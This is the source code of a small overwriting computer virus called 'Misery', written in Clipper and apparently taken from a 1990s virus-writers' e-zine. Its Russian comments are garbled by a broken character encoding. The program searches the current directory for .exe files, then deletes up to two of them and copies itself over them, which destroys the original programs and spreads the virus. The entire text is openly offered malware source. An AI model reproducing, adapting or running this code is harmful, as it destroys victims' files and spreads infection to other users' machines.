// [Death Virii Crew] Presents
// CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997

// ��਩ ����ᠭ� �� Clipper 5.01r
MyName:='Misery'                         // ��� �����饥 ���
Counter:=0                               // ���稪 ��ࠦ����� 䠩���
Declare aFiles[ADIR("*.exe")]            // � ᪮�쪮 � ��� ��-譨窮�
Declare aSizes[ADIR("*.exe")]            // � ��⠫��� ?
adir("*.exe",aFiles,aSizes)              // ����� � ࠧ���� ���쬥�
Iamis:=procname()+".EXE"                 // � ��� ���� ᥩ�� ����� ???
mysize:=aSizes[ascan(aFiles,Iamis)]      // � ����� � ���� ��ꥬ ����� ???
aeval(aFiles,{|element| verif(element)}) // ���, ���, ��, ����, ���� !
                                         // � ��� ��ࠦ��� !
                                         // �� �� ���⠫�� - � �� ������� !
quit                                     // ����... ��諠 ��� �������...
// �㭪� �஢�ન �த�⮢ ��������⥫쭮�� ���饣� �॥�����
function verif(fname)
if (Fname!=Iamis).and.(aSizes[ascan(aFiles,Fname)]!=MySize).and.(Counter<2)
   // ����ࠠ� ! ��諨 ᥡ� ������ ��⮬�� !
   infected(fname)      // ������� ���
   Counter:=Counter+1   // ���稪 +
endif
return NIL
//
function infected(FuckFile)
   if FErase(FuckFile)!=0
      return NIL      // � ����... �� 㤠�����... �� � �७ � ��� !
   endif
   run ("command.com /c copy "+Iamis+" "+FuckFile+" >NUL")
return NIL
